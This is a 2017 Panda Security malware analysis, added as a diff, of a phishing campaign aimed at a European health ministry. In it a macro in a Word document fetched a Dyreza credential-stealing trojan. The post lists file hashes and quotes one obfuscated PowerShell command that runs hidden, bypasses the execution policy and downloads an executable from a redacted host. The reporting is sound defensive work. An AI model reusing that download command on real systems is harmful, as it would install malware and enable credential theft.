@@ -1,0 +1,40 @@
+<title>Malware Capable of Paralyzing an Entire Ministry Neutralized</title>
+<source> http://www.pandasecurity.com/mediacenter/pandalabs/dangerous-malware-neutralized/ </source>
+<date> 2017_01_31 </date>
+<text>
+Cyberthreats are a constant risk and affect public administrations significantly.
+So much so that they have become a powerful instrument of aggression against public entities and citizens.
+They can lead to a serious deterioration in the quality of service, and also, above all, to data leaks concerning everything from personal information to state secrets.
+The combination of new technologies and the increase in the complexity of attacks, as well as the professionalization of cybercriminals, is highly dangerous.
+Last December, a large-scale spam campaign spanning more than ten countries was carried out, and specifically targeted a major European ministry.
+The attack, via phishing, was highly advanced and combined social engineering tactics with a powerful Trojan.
+The attack is sent by email with an attached Word document.
+At first, we suspected that it was a targeted attack, since the message came, supposedly, from a healthcare company and the recipient was an employee of the Ministry of Health in a European country.
+The present analysis describes the technical features of the harmful code found in the macro of the Word document.
+The goal of the macro was to download and run another malicious component.
+Below are shown a few static properties of the analyzed files.
+The hash of the Word document is the following:
+MD5:  B480B7EFE5E822BD3C3C90D818502068
+SHA1:  861ae1beb98704f121e28e57b429972be0410930
+According to the document’s metadata, the creation date was 2016-12-19.
+The malicous code’s signature, downloaded by Word, is the following:
+MD5:  3ea61e934c4fb7421087f10cacb14832
+SHA1:  bffb40c2520e923c7174bbc52767b3b87f7364a9
+The Word document gets to the victim’s computer by way of a spam email coming from a healthcare company.
+The text tricks the recipient into beleiving that the content is protected and needs to run the macro in order to gain access to it.
+According to the data recovered by Panda Security’s Collective Intelligence, this spam campaign took place on December 19, 2016 and affected several countries.
+Interactions with the infected system
+The basic function of the macro consists in downloading and running another malicious code from a URL embedded in the macro itself.
+Also, the macro is designed to run immediately upon being opened.
+Part of the obfuscated code contained in the macro
+Once the macro is running, the Word doc runs the following command in the system:
+cmd.exe /c pOWeRsHELL.EXe   -eXecUTIONpolICy   BYPAss  -noPrOfIlE -winDowsTyle    hidDEN (NeW-oBjECt    sYstEm.NeT.webcLiENt).DOWNloAdFILE(‘http://xxxxxxxxxxxx.com/13obCpHRxA1t3rbMpzh7iy1awHVm1MzNTX.exe’,’C:\Users\???
+?\AppData\Roaming.eXe’
+The system symbol (cmd.exe) runs the powershell with two embedded commands going through parameters:
+Thanks to the data obtained by the Intelligence Collective at Panda Security, we know that the last malicious code to be distributed by this campaign is a variant of the Dyreza family.
+Panda’s clients were protected proactively, without need of signatures or updates.
+The purpose of the malicious code is to steal credentials from browsers and add the compromised machine to bot network.
+It then waits for commands from the Command & Control Server.
+These commands come from the cybercriminals that operate it, and is able to download further new malware and carry out all kinds of malicious actions.
+Digitization in Public Administration leads to the exponential growth of the creation, storage and management of huge quantities of confidential data — data that does not allow for a single oversight.
+</text>
